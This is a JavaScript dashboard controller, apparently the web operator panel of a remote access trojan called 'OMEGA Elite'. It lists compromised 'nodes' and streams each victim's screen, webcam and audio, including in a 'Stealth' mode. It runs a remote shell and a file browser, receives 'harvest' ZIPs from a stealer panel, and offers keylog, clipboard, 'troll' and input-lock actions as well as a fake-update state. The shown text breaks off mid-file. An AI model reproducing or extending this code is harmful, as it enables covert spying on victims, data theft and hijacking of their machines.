/* ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   OMEGA ELITE — Dashboard Controller v21.5
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ */
"use strict";

// ── State ─────────────────────────────────────────────────────────────────────
let socket            = null;
let currentNodes      = [];
let currentTargetId   = null;
let currentTargetData = null;
let currentMode       = 'view';

// Shell state
let shellHistory    = [];
let shellHistoryIdx = -1;

// Stream state
let streaming        = false;
let frameCount       = 0;
let lastFrameTime    = 0;
let lastFrameReceivedTime = Date.now();
let streamStallInterval   = null;

// File explorer state
let filePathHistory = ['C:\\'];
let fileHistoryIdx  = 0;

// Styles & Multi-Monitor
let currentStreamStyle = 'Standard';
const STREAM_STYLES = [
    "Standard", "AnyDesk", "Discord", "MJPEG", "Stealth", "Burst",
    "Negative", "Grayscale", "Sepia", "Matrix", "Terminal", "Cyberpunk",
    "NightVision", "Thermal", "Inferno", "Plasma", "Viridis", "Magma",
    "Ocean", "Jet", "Turbo", "Autumn", "Bone", "Cividis", "Cool",
    "DeepGreen", "Hot", "HSV", "Parula", "Pink", "Rainbow", "Spring",
    "Summer", "Twilight", "Winter", "Retro8Bit", "Glitch",
    "EdgeDetect", "Emboss", "Sketch", "Comic", "Scanlines", "Solarize",
    "Posterize", "Threshold", "Blur", "Sharpen", "Glow", "Ascii-Lite", "Golden"
];
let streamMonitors = [];
let isGridView = false;

// MNK Cursor Overlay (default OFF, like AnyDesk)
let mnkOverlayEnabled = false;
let _lastCursorX = 0, _lastCursorY = 0;

// Process list state
let _procSortCol = 'mem';
let _procSortAsc = false;
let _procRefreshInterval = null;

// ── DOM helper ────────────────────────────────────────────────────────────────
const $ = id => document.getElementById(id);

// ── Init ──────────────────────────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', () => {
    initWebSocket();
    startFakeTelemetry();
    setupModalBackdrop();
    populateStylesGallery();
    initCameraPiP();
    logIntel('OMEGA Elite Command Center v22 initialised.', 'ok');
    logIntel('Apex Engine Active — all systems nominal.', 'info');
});


// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// WEBSOCKET
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

function initWebSocket() {
    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
    setConnState('connecting');

    try {
        socket = new WebSocket(`${proto}//${location.host}/ws`);
        socket.binaryType = 'arraybuffer';
    } catch (e) {
        setConnState('offline');
        logIntel('WebSocket init failed: ' + e.message, 'err');
        setTimeout(initWebSocket, 6000);
        return;
    }

    socket.onopen = () => {
        socket.send(JSON.stringify({ type: 'portal' }));
        setConnState('online');
        logIntel('Connection secure. Dashboard synchronised.', 'ok');
        if (currentTargetId) {
            setTimeout(() => {
                safeSend({ type: 'select_device', t: 'select_device', id: currentTargetId });
                logIntel(`Auto-reselected node: ${shortId(currentTargetId)}`, 'info');
            }, 400);
        }
    };

    socket.onmessage = ev => {
        if (ev.data instanceof ArrayBuffer) { handleBinary(ev.data); return; }
        try { handleMessage(JSON.parse(ev.data)); } catch {}
    };

    socket.onclose = () => {
        setConnState('offline');
        logIntel('Connection lost — retrying in 5s…', 'warn');
        stopStream();
        setTimeout(initWebSocket, 5000);
    };

    socket.onerror = () => {
        setConnState('offline');
        stopStream();
    };
}

function safeSend(obj) {
    if (socket && socket.readyState === WebSocket.OPEN) {
        socket.send(typeof obj === 'string' ? obj : JSON.stringify(obj));
    }
}

// ── Message Router ────────────────────────────────────────────────────────────
function handleMessage(msg) {
    const t = msg.t || msg.type || '';

    switch (t) {
        case 'devices':
        case 'node_list':
            currentNodes = msg.data || msg.nodes || [];
            renderNodeCards();
            renderNodeTable();
            updateStatCounters();
            break;

        case 'handshake_ok':
            logIntel('Server handshake confirmed.', 'ok');
            break;

        case 'log':
            logIntel(msg.msg || msg.message || String(msg));
            break;

        case 'info':
            logIntel(msg.msg || msg.message || '—', 'info');
            if (currentMode === 'shell') appendShellLine(`<span style="color:var(--accent-blue)">ℹ ${escHtml(msg.msg || '')}</span>`);
            // Relay to stealer log if matching
            if (msg.msg && msg.msg.startsWith('[')) {
                appendStealerLog(msg.msg);
                const hs = $('harvesterStatus');
                if (hs) {
                    if (msg.msg.includes('Initiating')) hs.textContent = '● STATUS: ACTIVE';
                    if (msg.msg.includes('complete'))   hs.textContent = '● STATUS: FINALISING';
                }
            }
            break;

        case 'shell_res':
            handleShellResponse(msg.data || msg.output || '');
            break;

        case 'screenshot_done':
            break;

        case 'fs_resp':
            renderFileList(msg.data || [], msg.path || 'C:\\');
            break;

        case 'process_list':
            renderProcessList(msg.data || []);
            break;

        case 'monitor_ack':
            logIntel(`Monitor switched to #${msg.idx}`, 'ok');
            // Smooth transition on stream image
            const img = $('desktopViewImg');
            if (img) {
                img.style.transition = 'opacity 0.25s ease';
                img.style.opacity = '0.3';
                setTimeout(() => { img.style.opacity = '1'; }, 280);
            }
            break;

        case 'file_chunk':
            receiveFileChunk(msg.name, msg.data);
            break;

        case 'file_done':
            finaliseFileDownload(msg.name);
            break;

        case 'telemetry':
            if (currentTargetData && msg.id === currentTargetId) {
                Object.assign(currentTargetData.specs || {}, msg.data || {});
                if (currentMode === 'intel') populateIntelPanel();
            }
            break;

        case 'monitors':
            updateMonitorList(msg.data || []);
            break;

        case 'rtc_answer':
            if (rtcPeerConnection) {
                rtcPeerConnection.setRemoteDescription(
                    new RTCSessionDescription({ type: msg.type, sdp: msg.sdp })
                ).catch(e => logIntel(`WebRTC Answer error: ${e}`, 'err'));
            }
            break;

        case 'rtc_ice':
            if (rtcPeerConnection) {
                rtcPeerConnection.addIceCandidate(new RTCIceCandidate({
                    candidate: msg.candidate,
                    sdpMid: msg.sdpMid,
                    sdpMLineIndex: msg.sdpMLineIndex
                })).catch(e => logIntel(`WebRTC ICE error: ${e}`, 'warn'));
            }
            break;

        case 'volume':
            updateVolumeDisplay(msg.level);
            break;

        case 'clipboard_update':
            handleClipboardUpdate(msg.data || '');
            break;

        case 'cam_list':
            handleCamList(msg.data || []);
            break;

        case 'connections':
            renderConnections(msg.data || []);
            break;

        case 'software_list':
            renderSoftwareList(msg.data || []);
            break;

        case 'history_list':
            renderHistoryList(msg.data || []);
            break;

        case 'startup_list':
            renderStartupList(msg.data || []);
            break;

        case 'env_vars':
            renderEnvVars(msg.data || {});
            break;

        case 'geo_info':
            renderGeoInfo(msg.data || {});
            break;

        case 'lan_scan_result':
            renderLanScan(msg.data || []);
            break;

        case 'fake_update_state':
            _onFakeUpdateState(msg);
            break;

        default:
            if (msg.id || msg.hostname) {
                currentNodes = currentNodes.map(n => {
                    if ((n.hostname || n.id) === (msg.id || msg.hostname)) {
                        return { ...n, ...msg };
                    }
                    return n;
                });
            }
            break;
    }
}


// ── Binary Handler ────────────────────────────────────────────────────────────
function handleBinary(buf) {
    const view = new Uint8Array(buf);
    if (view.length < 2) return;

    const tag     = view[0];
    const payload = buf.slice(1);

    if (tag === 0x03) {
        // Primary desktop frame
        renderLiveFrame(payload, 'desktopViewImg');
        // Also update grid cell 0 if in grid mode
        if (isGridView) updateGridCell(0, payload);
    } else if (tag === 0x04) {
        renderLiveFrame(payload, 'cameraViewImg');
        const pip = $('pipCamView');
        if (pip) pip.style.display = 'block';
    } else if (tag === 0x05) {
        playPcm(payload);
    } else if (tag === 0x06) {
        downloadHarvestZip(payload);
    } else if (tag >= 0x10 && tag <= 0x13) {
        // Per-monitor grid frames (channels 0x10–0x13 = monitors 0–3)
        const monIdx = tag - 0x10;
        updateGridCell(monIdx, payload);
    }
}

function downloadHarvestZip(buf) {
    const blob = new Blob([buf], { type: 'application/zip' });
    const url  = URL.createObjectURL(blob);
    const a    = document.createElement('a');
    const ts   = new Date().toISOString().replace(/[:.]/g, '-');
    a.href     = url;
    a.download = `harvest_${currentTargetId || 'omega'}_${ts}.zip`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    logIntel('Omega Harvest ZIP received.', 'ok');
    const hs = $('harvesterStatus');
    if (hs) hs.textContent = '● STATUS: STANDBY';
    appendStealerLog('[SUCCESS] Extraction Bundle Dispatched.');
}

// ── Frame Rendering ───────────────────────────────────────────────────────────
let apexFrames  = {};
let isRendering = false;

function renderLiveFrame(jpegBuf, targetId) {
    const blob = new Blob([jpegBuf], { type: 'image/jpeg' });
    const url  = URL.createObjectURL(blob);
    apexFrames[targetId] = url;
    lastFrameReceivedTime = Date.now();

    if (!isRendering) {
        isRendering = true;
        requestAnimationFrame(processApexQueue);
    }

    const now = Date.now();
    frameCount++;
    if (now - lastFrameTime > 1000) {
        const fps = Math.round(frameCount * 1000 / (now - lastFrameTime));
        const fpsEl = $('streamFps');
        if (fpsEl) fpsEl.textContent = `${fps} FPS`;
        frameCount = 0;
        lastFrameTime = now;
    }

    if (!streamStallInterval) {
        streamStallInterval = setInterval(checkStreamStall, 1000);
    }
}

function processApexQueue() {
    try {
        for (const id in apexFrames) {
            const url = apexFrames[id];
            if (!url) continue;
            const img = $(id);
            if (img) {
                if (img._prevUrl) URL.revokeObjectURL(img._prevUrl);
                img._prevUrl = url;
                img.src = url;
                img.style.display = 'block';
                img.style.opacity = '1';

                const ph = $('streamPlaceholder');
                if (ph) ph.style.display = 'none';
                const mv = $('mainStreamView');
                if (mv) { mv.style.display = 'block'; mv.style.visibility = 'visible'; }
            }
            apexFrames[id] = null;
        }
    } finally {
        // Always clear the flag — prevents permanent stall
        isRendering = false;
    }
}

function updateGridCell(monIdx, jpegBuf) {
    const cellId = `grid-monitor-img-${monIdx}`;
    let cell = $(cellId);
    if (!cell) {
        // Create a grid cell if it doesn't exist yet
        const grid = $('monitorGridView');
        if (!grid) return;
        const box = document.createElement('div');
        box.className = 'grid-monitor-box';
        box.id = `grid-monitor-box-${monIdx}`;

        const info = document.createElement('div');
        info.className = 'grid-monitor-info';
        info.innerHTML = `<span>Monitor ${monIdx + 1}</span><span id="grid-mon-res-${monIdx}">—</span>`;

        const img = document.createElement('img');
        img.id = cellId;
        img.style.cssText = 'width:100%;aspect-ratio:16/9;background:#0a0a0a;display:block;object-fit:contain;';

        box.appendChild(info);
        box.appendChild(img);
        box.onclick = () => {
            $('streamMonitorSelect').value = monIdx;
            changeMonitor();
            if (isGridView) toggleGridView();
        };
        grid.appendChild(box);
        cell = img;
    }

    const blob = new Blob([jpegBuf], { type: 'image/jpeg' });
    const url  = URL.createObjectURL(blob);
    if (cell._prevUrl) URL.revokeObjectURL(cell._prevUrl);
    cell._prevUrl = url;
    cell.src = url;
}

function checkStreamStall() {
    if (!streaming) {
        clearInterval(streamStallInterval);
        streamStallInterval = null;
        return;
    }
    const delta = Date.now() - lastFrameReceivedTime;
    const resEl = $('streamRes');
    if (delta > 3000) {
        if (resEl) { resEl.textContent = '● STATUS: WAITING FOR UPLINK...'; resEl.style.color = 'var(--accent-red)'; }
    } else if (delta < 1000) {
        if (resEl && !resEl.textContent.includes('WebRTC')) {
            resEl.textContent = '● STATUS: LIVE (Apex-MJPEG)';
            resEl.style.color = 'var(--accent-teal)';
        }
    }
}

// ── Audio ─────────────────────────────────────────────────────────────────────
let audioCtx = null;
let nextAudioTime = 0;

function playPcm(buf) {
    if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 44100 });
    const int16  = new Int16Array(buf);
    const float32 = new Float32Array(int16.length);
    for (let i = 0; i < int16.length; i++) float32[i] = int16[i] / 32768.0;
    const audioBuf = audioCtx.createBuffer(1, float32.length, 44100);
    audioBuf.copyToChannel(float32, 0);
    const source = audioCtx.createBufferSource();
    source.buffer = audioBuf;
    source.connect(audioCtx.destination);
    const ct = audioCtx.currentTime;
    if (nextAudioTime < ct) nextAudioTime = ct;
    source.start(nextAudioTime);
    nextAudioTime += audioBuf.duration;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// SCREEN STREAM
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

let rtcPeerConnection = null;

function toggleStream() {
    streaming ? stopStream() : startStream();
}

function startStream() {
    if (!currentTargetId) {
        logIntel('No node selected for streaming.', 'warn');
        return;
    }
    streaming = true;

    const btn  = $('streamToggleBtn');
    const icon = $('streamBtnIcon');
    const text = $('streamBtnText');
    if (btn)  btn.style.borderColor = 'rgba(16,212,168,0.4)';
    if (icon) icon.innerHTML = '<rect x="6" y="4" width="4" height="16"/><rect x="14" y="4" width="4" height="16"/>';
    if (text) text.textContent = 'Stop Stream';

    const ph = $('streamPlaceholder');
    if (ph) ph.style.display = 'none';

    if (!isGridView) {
        const mv = $('mainStreamView');
        if (mv) { mv.style.display = 'block'; mv.style.visibility = 'visible'; }
        const desktopImg = $('desktopViewImg');
        if (desktopImg) desktopImg.style.display = 'block';
    } else {
        const gv = $('monitorGridView');
        if (gv) gv.style.display = 'grid';
    }

    logIntel(`Starting stream → ${shortId(currentTargetId)}`, 'ok');

    // Send ss_start with both t and type fields
    safeSend({ t: 'ss_start', type: 'ss_start' });

    // Enable grid mode on agent if in grid view
    if (isGridView) {
        safeSend({ t: 'set_grid', type: 'set_grid', v: true });
    }

    // Try WebRTC first, fall back gracefully to MJPEG
    if (rtcPeerConnection) rtcPeerConnection.close();
    rtcPeerConnection = new RTCPeerConnection({
        iceServers: [
            { urls: "stun:stun.l.google.com:19302" },
            { urls: "stun:stun1.l.google.com:19302" }
        ]
    });

    rtcPeerConnection.onicecandidate = e => {
        if (e.candidate) {
            safeSend({
                t: 'rtc_ice',
                candidate: e.candidate.candidate,
                sdpMid: e.candidate.sdpMid,
                sdpMLineIndex: e.candidate.sdpMLineIndex
            });
        }
    };

    rtcPeerConnection.ontrack = e => {
        logIntel(`WebRTC track received: ${e.track.kind}`, 'info');
    };

    rtcPeerConnection.onconnectionstatechange = () => {
        const state = rtcPeerConnection ? rtcPeerConnection.connectionState : 'closed';
        logIntel(`WebRTC: ${state.toUpperCase()}`, state === 'connected' ? 'ok' : (state === 'failed' ? 'err' : 'info'));
        const resEl = $('streamRes');
        if (resEl) {
            resEl.textContent = `WebRTC: ${state.toUpperCase()}`;
            resEl.style.color = state === 'connected' ? 'var(--accent-teal)' : (state === 'failed' ? 'var(--accent-red)' : 'var(--text-muted)');
        }
    };

    rtcPeerConnection.addTransceiver('video', { direction: 'recvonly' });
    rtcPeerConnection.addTransceiver('video', { direction: 'recvonly' });
    rtcPeerConnection.addTransceiver('audio', { direction: 'recvonly' });
    rtcPeerConnection.addTransceiver('audio', { direction: 'recvonly' });

    rtcPeerConnection.createOffer()
        .then(offer => rtcPeerConnection.setLocalDescription(offer))
        .then(() => {
            safeSend({
                t: 'rtc_offer',
                sdp: rtcPeerConnection.localDescription.sdp,
                type: rtcPeerConnection.localDescription.type
            });
        })
        .catch(e => logIntel(`Offer creation failed: ${e}`, 'err'));
}

function stopStream() {
    streaming = false;

    safeSend({ t: 'set_grid', type: 'set_grid', v: false });
    safeSend({ t: 'ss_stop', type: 'ss_stop' });

    if (rtcPeerConnection) { rtcPeerConnection.close(); rtcPeerConnection = null; }

    const btn  = $('streamToggleBtn');
    const icon = $('streamBtnIcon');
    const text = $('streamBtnText');
    if (btn)  btn.style.borderColor = '';
    if (icon) icon.innerHTML = '<polygon points="5 3 19 12 5 21 5 3"/>';
    if (text) text.textContent = 'Start Stream';

    const ph = $('streamPlaceholder');
    if (ph) ph.style.display = 'flex';
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// NODE CARDS (Overview)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

function renderNodeCards() {
    const grid  = $('nodeCardsGrid');
    const empty = $('nodeEmptyState');
    if (!grid) return;

    Array.from(grid.children).forEach(el => { if (el !== empty) el.remove(); });

    if (currentNodes.length === 0) {
        if (empty) empty.style.display = 'flex';
        return;
    }
    if (empty) empty.style.display = 'none';

    currentNodes.forEach((node, i) => {
        const id     = node.hostname || node.id || 'Unknown';
        const specs  = node.specs || {};
        const os     = specs.os     || node.os    || 'Unknown OS';
        const ip     = specs.ip     || node.ip    || '—';
        const user   = specs.user   || node.user  || '—';
        const cpu    = specs.cpu    || '—';
        const ram    = specs.ram    || '—';
        const status = node.status  || 'Active';
        const isOn   = status === 'Active';

        const card = document.createElement('div');
        card.className = 'node-card';
        card.style.animationDelay = `${i * 55}ms`;
        card.innerHTML = `
            <div class="nc-top">
                <div>
                    <div class="nc-id">#${shortId(id)}</div>
                    <span class="badge ${isOn ? 'badge-teal' : 'badge-amber'}" style="margin-top:4px;font-size:0.62rem;">
                        <span class="badge-dot"></span>${escHtml(status)}
                    </span>
                </div>
                <div class="nc-os-icon">${osIconSvg(os)}</div>
            </div>
            <div class="nc-info">
                <div class="nc-info-row"><span class="nc-info-label">IP</span><span class="nc-info-value">${escHtml(ip)}</span></div>
                <div class="nc-info-row"><span class="nc-info-label">User</span><span class="nc-info-value">${escHtml(user)}</span></div>
                <div class="nc-info-row"><span class="nc-info-label">OS</span><span class="nc-info-value">${escHtml(shortenOS(os))}</span></div>
                <div class="nc-info-row"><span class="nc-info-label">CPU</span><span class="nc-info-value">${escHtml(cpu)}</span></div>
                <div class="nc-info-row"><span class="nc-info-label">RAM</span><span class="nc-info-value">${escHtml(ram)}</span></div>
            </div>
            <div class="nc-divider"></div>
            <div class="nc-actions">
                <button class="nc-action-btn view" onclick="openRemote('${escAttr(id)}',${i},'view')">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>Screen
                </button>
                <button class="nc-action-btn shell" onclick="openRemote('${escAttr(id)}',${i},'shell')">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>Shell
                </button>
                <button class="nc-action-btn files" onclick="openRemote('${escAttr(id)}',${i},'files')">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>Files
                </button>
                <button class="nc-action-btn info" onclick="openRemote('${escAttr(id)}',${i},'intel')">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>Intel
                </button>
            </div>`;
        grid.appendChild(card);
    });
}

function renderNodeTable() {
    const body = $('nodeBody');
    if (!body) return;

    if (currentNodes.length === 0) {
        body.innerHTML = `<tr><td colspan="7" style="text-align:center;padding:3rem;color:var(--text-muted);font-size:0.85rem">No active nodes detected.</td></tr>`;
        return;
    }

    body.innerHTML = currentNodes.map((node, i) => {
        const id     = node.hostname || node.id || '—';
        const specs  = node.specs || {};
        const os     = specs.os    || node.os   || '—';
        const ip     = specs.ip    || node.ip   || '—';
        const user   = specs.user  || '—';
        const cpu    = specs.cpu   || '—';
        const status = node.status || 'Active';
        const isOn   = status === 'Active';
        return `
        <tr style="animation-delay:${i*35}ms">
            <td><span class="node-id-cell">#${shortId(id)}</span></td>
            <td><div style="display:flex;align-items:center;gap:0.5rem">${osIconSvg(os)}<span style="font-size:0.84rem">${escHtml(os)}</span></div></td>
            <td><span class="node-ip-cell">${escHtml(ip)}</span></td>
            <td style="color:var(--text-secondary);font-size:0.84rem">${escHtml(user)}</td>
            <td style="color:var(--text-muted);font-size:0.8rem">${escHtml(cpu)}</td>
            <td><span class="badge ${isOn ? 'badge-teal' : 'badge-amber'}"><span class="badge-dot"></span>${escHtml(status)}</span></td>
            <td>
                <button class="btn btn-operate" onclick="openRemote('${escAttr(id)}',${i},'view')">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="width:11px;height:11px"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
                    Operate
                </button>
            </td>
        </tr>`;
    }).join('');
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// COUNTERS
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

function updateStatCounters() {
    const n       = currentNodes.length;
    const active  = currentNodes.filter(nd => nd.status === 'Active').length;
    setText('countNodes', active);
    setText('nodeCountBadge', active);
    const prev = parseInt($('totalClients')?.textContent) || 0;
    if (n > prev) setText('totalClients', n);
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// INTELLIGENCE LOG
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

function logIntel(msg, level) {
    const stream = $('intelStream');
    if (!stream) return;
    const ts  = new Date().toLocaleTimeString('en-GB', { hour12: false });
    const cls = level ? `intel-msg ${level}` : 'intel-msg';
    const line = document.createElement('div');
    line.className = 'intel-line';
    line.innerHTML = `<span class="intel-ts">${ts}</span><span class="${cls}">${escHtml(String(msg))}</span>`;
    stream.prepend(line);
    while (stream.children.length > 200) stream.lastChild.remove();
}

function clearLogs() {
    const s = $('intelStream');
    if (s) s.innerHTML = '';
    logIntel('Log cleared.', 'ok');
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// CONNECTION STATE
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

function setConnState(state) {
    const dot    = $('connDot');
    const status = $('connStatus');
    const badge  = $('wsStatusBadge');
    if (!dot || !status) return;

    if (state === 'online') {
        dot.className = 'conn-dot';
        status.textContent = 'Live';
        if (badge) { badge.className = 'badge badge-teal'; badge.innerHTML = '<span class="badge-dot"></span>WebSocket Live'; }
    } else if (state === 'offline') {
        dot.className = 'conn-dot offline';
        status.textContent = 'Offline';
        if (badge) { badge.className = 'badge badge-red'; badge.innerHTML = '<span class="badge-dot"></span>Disconnected'; }
    } else {
        dot.className = 'conn-dot offline';
        status.textContent = 'Connecting…';
    }
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// REMOTE MODAL
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

function openRemote(nodeId, idx, mode) {
    currentTargetId   = nodeId;
    currentTargetData = currentNodes[idx] || {};

    safeSend({ type: 'select_device', t: 'select_device', id: nodeId });

    const short = shortId(nodeId);
    setText('modalTarget', `Remote Control — ${short}`);
    setText('modalNodeId', short);

    const modal = $('remoteModal');
    modal.style.display = 'flex';
    document.body.style.overflow = 'hidden';

    setControlMode(mode || 'view');
    logIntel(`Remote session opened → ${short}`, 'ok');
    populateMonitors();
}

function populateMonitors() {
    const selector = $('streamMonitorSelect');
    if (!selector || !currentTargetData || !currentTargetData.specs) return;
    selector.innerHTML = '';
    const mons = currentTargetData.specs.monitors || [];
    if (mons.length === 0) {
        selector.innerHTML = `<option value="0">Default Monitor</option>`;
        return;
    }
    mons.forEach((monTitle, idx) => {
        const opt = document.createElement('option');
        opt.value = idx;
        opt.textContent = String(monTitle);
        selector.appendChild(opt);
    });
}

function changeMonitor() {
    const selector = $('streamMonitorSelect');
    if (!selector) return;
    const idx = parseInt(selector.value, 10);
    logIntel(`Switching monitor to #${idx}`, 'ok');
    // Send both MJPEG set_monitor and WebRTC rtc_toggle for compatibility
    safeSend({ t: 'set_monitor', type: 'set_monitor', v: idx });
    safeSend({ t: 'rtc_toggle', type: 'rtc_toggle', action: 'monitor', value: idx });
}

const trackStates = { camera: false, mic: false, audio: false };

function toggleTrack(type) {
    if (!streaming) { logIntel('Start the stream first.', 'warn'); return; }
    trackStates[type] = !trackStates[type];
    updateTrackUI();
    safeSend({ t: 'rtc_toggle', type: 'rtc_toggle', action: type, value: trackStates[type] });
}

function updateTrackUI() {
    Object.keys(trackStates).forEach(type => {
        const btn = $(`btn-toggle-${type}`);
        if (btn) trackStates[type] ? btn.classList.add('active') : btn.classList.remove('active');
    });
}

function closeModal() {
    stopStream();
    stopProcessRefresh();
    $('remoteModal').style.display = 'none';
    document.body.style.overflow = '';
    currentTargetId   = null;
    currentTargetData = null;
    logIntel('Remote session closed.');
}

function setupModalBackdrop() {
    const modal = $('remoteModal');
    if (modal) modal.addEventListener('click', e => { if (e.target === modal) closeModal(); });
    document.addEventListener('keydown', e => {
        if ($('remoteModal')?.style.display === 'flex') {
            if (e.key === 'Escape') { closeModal(); return; }
            // Forward keyboard to agent when stream is active
            if (streaming && currentMode === 'view') {
                handleStreamKeyboard(e);
            }
        }
    });
    document.addEventListener('keyup', e => {
        if ($('remoteModal')?.style.display === 'flex' && streaming && currentMode === 'view') {
            handleStreamKeyboardUp(e);
        }
    });
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// TAB SWITCHING
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

const MODES = ['view', 'shell', 'files', 'intel', 'stealer', 'troll', 'tasks',
               'camera', 'audio', 'clipboard', 'recon', 'geo', 'keylog', 'process'];

function setControlMode(mode) {
    currentMode = mode;

    // Hide ALL modal panels (catches any panel not in MODES list)
    document.querySelectorAll('.modal-panel').forEach(p => p.classList.remove('panel-active'));

    // Deactivate all nav buttons
    MODES.forEach(m => {
        const btn = $(`mnav-${m}`);
        if (btn) btn.classList.remove('active');
    });

    const activeBtn   = $(`mnav-${mode}`);
    const activePanel = $(`panel-${mode}`);
    if (activeBtn)   activeBtn.classList.add('active');
    if (activePanel) activePanel.classList.add('panel-active');

    // Mode-specific init
    if (mode === 'shell') {
        setTimeout(() => { const inp = $('shellInput'); if (inp) inp.focus(); }, 50);
    } else if (mode === 'files') {
        navigateTo($('filePath')?.value || 'C:\\');
    } else if (mode === 'intel') {
        populateIntelPanel();
    } else if (mode === 'tasks') {
        startProcessRefresh();
    }

    if (mode !== 'tasks') stopProcessRefresh();
    if (mode !== 'view' && streaming) stopStream();
}

// ── Toast / Flash ─────────────────────────────────────────────────────────────
function showModalToast(msg, type = 'ok') {
    const old = document.getElementById('modalToast');
    if (old) old.remove();
    const colors = { ok: 'var(--accent-teal)', warn: 'var(--accent-amber)', err: 'var(--accent-red)', info: 'var(--accent-blue)' };
    const toast = document.createElement('div');
    toast.id = 'modalToast';
    toast.textContent = msg;
    toast.style.cssText = [
        'position:fixed','bottom:24px','left:50%','transform:translateX(-50%)',
        'background:rgba(5,5,15,0.95)',`border:1px solid ${colors[type] || colors.ok}`,
        `color:${colors[type] || colors.ok}`,'padding:9px 20px','border-radius:99px',
        'font-size:0.78rem','font-weight:600','z-index:9999','pointer-events:none',
        'letter-spacing:0.03em','backdrop-filter:blur(12px)',
        'box-shadow:0 8px 24px rgba(0,0,0,0.6)',
    ].join(';');
    document.body.appendChild(toast);
    setTimeout(() => { toast.style.transition='opacity 0.4s'; toast.style.opacity='0'; }, 1800);
    setTimeout(() => toast.remove(), 2300);
}

function sendCmd(obj) {
    if (!currentTargetId) { showModalToast('No node selected', 'warn'); return; }
    safeSend(obj);
}

function sendTrollLegacy(action, value) {
    if (!currentTargetId) { showModalToast('No node selected', 'err'); return; }
    if (action === 'lock_mnk')   return sendMNK('all', true);
    if (action === 'unlock_mnk') return sendMNK('all', false);
    const msg = { t: 'troll', type: 'troll', action };
    if (value !== undefined) msg.value = value;
    safeSend(msg);
    logIntel(`Troll dispatched [${action}] → ${shortId(currentTargetId)}`, 'warn');
    showModalToast(`⚡ ${action} sent`, 'warn');
    const msgIn = $('trollMsgInput');
    const ttsIn = $('trollTtsInput');
    if (action === 'msg' && msgIn) msgIn.value = '';
    if (action === 'tts' && ttsIn) ttsIn.value = '';
}

function sendMNK(mode, state) {
    if (!currentTargetId) { showModalToast('No node selected', 'err'); return; }
    safeSend({ t: 'mnk', type: 'mnk', mode, state });
    const label = state ? '🔒 LOCKED' : '🔓 RELEASED';
    logIntel(`${mode.toUpperCase()} Control: ${label}`, state ? 'warn' : 'ok');
    showModalToast(`${mode.toUpperCase()} ${label}`, state ? 'warn' : 'ok');
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// MNK CURSOR OVERLAY (AnyDesk-style)
